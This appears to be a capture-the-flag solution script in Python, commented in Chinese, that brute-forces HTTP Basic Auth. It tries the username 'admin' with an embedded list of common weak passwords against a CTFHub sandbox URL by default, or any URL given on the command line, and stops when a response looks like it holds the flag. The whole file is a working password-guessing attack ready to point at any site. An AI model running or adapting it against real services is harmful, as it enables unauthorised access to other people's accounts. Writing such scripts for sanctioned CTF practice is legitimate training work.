# -*- coding: utf-8 -*-
"""HTTP Basic Auth 爆破脚本：用户名 admin + 字典密码
运行：python basic_auth_brute.py <URL>
"""
import requests
import sys

URL = sys.argv[1] if len(sys.argv) > 1 else "http://challenge-52bf5e999da1a0df.sandbox.ctfhub.com:10800"
USER = "admin"

# CTFHub 给的弱密码字典
PASSWORDS = """123456
password
line
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
696969
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
pussy
superman
1qaz2wsx
7777777
admin
abc
123""".strip().split('\n')

print(f"目标: {URL}")
print(f"用户名: {USER}")
print(f"字典: {len(PASSWORDS)} 个密码")
print()

for i, pwd in enumerate(PASSWORDS, 1):
    try:
        r = requests.get(URL, auth=(USER, pwd), timeout=8)
        status = '✅' if r.status_code == 200 and 'Click' not in r.text or 'flag' in r.text.lower() else f'  {r.status_code}'
        print(f"[{i:>2}/{len(PASSWORDS)}] {USER}/{pwd:<15} {status} len={len(r.text)}")
        if r.status_code == 200 and ('flag' in r.text.lower() or 'Click' in r.text):
            print(f"\n🏁 找到！用户名: {USER} 密码: {pwd}")
            print("响应前 300 字符:")
            print(r.text[:300])
            break
    except Exception as e:
        print(f"[{i}] {pwd} 异常: {str(e)[:40]}")
